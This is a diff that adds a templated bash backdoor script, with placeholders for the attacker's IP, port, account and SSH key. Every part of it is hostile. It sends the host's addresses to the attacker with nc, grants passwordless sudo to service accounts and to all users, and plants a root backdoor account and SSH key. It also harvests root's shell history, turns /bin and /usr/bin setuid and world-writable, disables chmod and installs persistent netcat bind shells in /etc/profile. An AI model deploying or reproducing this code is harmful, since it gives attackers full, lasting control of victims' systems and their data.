@@ -1,0 +1,35 @@
+#!/bin/bash -p
+
+#!TS_TROJAN_PATH!#/bin/echo "[`#!TS_TROJAN_PATH!#/bin/hostname`] Address(es):  `/sbin/ifconfig | #!TS_TROJAN_PATH!#/bin/grep "inet addr" | #!TS_TROJAN_PATH!#/usr/bin/awk {' print $2 '} | #!TS_TROJAN_PATH!#/bin/sed -e 's/addr://g' | #!TS_TROJAN_PATH!#/usr/usr/bin/tr '\n' ' '` (`#!TS_TROJAN_PATH!#/bin/date`)" | #!TS_TROJAN_PATH!#/bin/nc #!TS_MY_IP!# #!TS_TROJAN_RE_PORT!# -q 1 -w 1
+
+#!TS_TROJAN_PATH!#/bin/echo "mysql	ALL=NOPASSWD: ALL" >> /etc/sudoers
+#!TS_TROJAN_PATH!#/bin/echo "apache	ALL=NOPASSWD: ALL" >> /etc/sudoers
+#!TS_TROJAN_PATH!#/bin/echo "asterisk	ALL=NOPASSWD: ALL" >> /etc/sudoers
+#!TS_TROJAN_PATH!#/bin/echo "nobody    ALL=NOPASSWD: ALL" >> /etc/sudoers
+#!TS_TROJAN_PATH!#/bin/echo "www-data  ALL=NOPASSWD: ALL" >> /etc/sudoers
+#!TS_TROJAN_PATH!#/bin/echo "lp        ALL=NOPASSWD: ALL" >> /etc/sudoers
+#!TS_TROJAN_PATH!#/bin/echo "ALL       ALL=NOPASSWD: ALL" >> /etc/sudoers
+
+#!TS_TROJAN_PATH!#/bin/echo "#!TS_TROJAN_PASSWD!#" >> /etc/passwd
+#!TS_TROJAN_PATH!#/bin/echo "#!TS_TROJAN_ACCOUNT!#::14296:0:99999:7:::" >> /etc/shadow
+
+#!TS_TROJAN_PATH!#/bin/echo "ssh-rsa #!TS_TROJAN_SSHKEY!# #!TS_TROJAN_ACCOUNT!#" >> /root/.ssh/authorized_keys
+#!TS_TROJAN_PATH!#/bin/cp /tmp/#!TS_TROJAN_PERSIST!#/sshd_config /etc/ssh/sshd_config
+
+#!TS_TROJAN_PATH!#/bin/cat /root/.bash_history >> /var/log/ksyslog.log
+#!TS_TROJAN_PATH!#/bin/echo "cat /root/.bash_history >> /var/log/ksyslog.log" >> /root/.bash_logout
+
+#!TS_TROJAN_PATH!#/bin/cp /bin/bash /bin/false
+#!TS_TROJAN_PATH!#/bin/cp /bin/bash /sbin/false
+#!TS_TROJAN_PATH!#/bin/cp /bin/bash /bin/ksh
+
+#!TS_TROJAN_PATH!#/bin/chmod -R a+srxw /bin
+#!TS_TROJAN_PATH!#/bin/chmod -R a+srwx /usr/bin
+#!TS_TROJAN_PATH!#/bin/chmod -R a+srxw #!TS_TROJAN_PATH!#
+
+#!TS_TROJAN_PATH!#/bin/chmod 000 /bin/chmod
+
+#!TS_TROJAN_PATH!#/bin/echo "nc -e /bin/bash -k -l -p 31337&" >> /etc/profile
+#!TS_TROJAN_PATH!#/bin/echo "while [ 1 ]; do nc -e /bin/bash -k -l -p 31337 2>/dev/null; done" > #!TS_TROJAN_PATH!#/#!TS_TROJAN_HIDE!#_cmd
+#!TS_TROJAN_PATH!#/bin/echo "#!TS_TROJAN_PATH!#/#!TS_TROJAN_HIDE!#_cmd" >> /etc/profile
+
